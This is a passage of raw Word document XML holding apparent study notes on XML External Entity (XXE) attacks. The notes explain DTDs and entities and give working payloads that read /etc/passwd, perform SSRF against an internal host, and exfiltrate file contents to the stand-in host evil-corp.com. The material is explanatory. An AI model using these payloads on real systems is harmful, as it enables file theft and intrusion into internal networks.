        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>gt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>lt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Document type definition (DTD)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: defines the structure of an XML document.  DTD is defined using a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>DOCTYPE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>XML custom entity</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: define a custom entity in a DTD: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [ &lt;!ENTITY bar "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>bambaz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>" &gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which will cause </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&amp;bar;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be replaced with the value </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>bambaz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>XML external entity</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: define an external entity in a DTD using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>SYSTEM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> keyword.  They can be referenced from a local file or URL:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://normal-website.com" &gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "file:///path/to/file" &gt; ]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Most XXE a</w:t>
      </w:r>
      <w:r>
        <w:t>ttacks are caused by XML external entities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XXE attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Retrieve file contents</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Return the contents of `/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>` --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "file:///etc/passwd" &gt; ]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Perform SSRF attack</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Return contents of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>`http://internal-website.com` --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://internal-website.com" &gt; ]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve">Blind XXE to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve"> data</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cause the contents of `/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>` to be send to http://evil-corp.com --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;!DOCTYPE foo [ &lt;!ENTITY % file SYSTEM "f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ile:///etc/passwd" &gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "&lt;!ENTITY &amp;#x25; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM 'http://evil-corp.com/?x=%file;'&gt;"&gt; %</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>; %</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>; ]&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Blind XXE to retrieve data via error messages</w:t>
      </w:r>
      <w:r>
        <w:t>: attacker triggers an XML parsing error that leaks sensitive data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>:bulb</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>: When</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> testing for XXE vulnerabilities, you will often need to test each node of the XML document to see if it is vulnerable.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Retrieve file contents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Attacker must introduce or edit the DOCTYPE.  For example, an XML request that gets stock levels:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;?xml </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>version="1.0" encoding="UTF-8"?&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;381&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
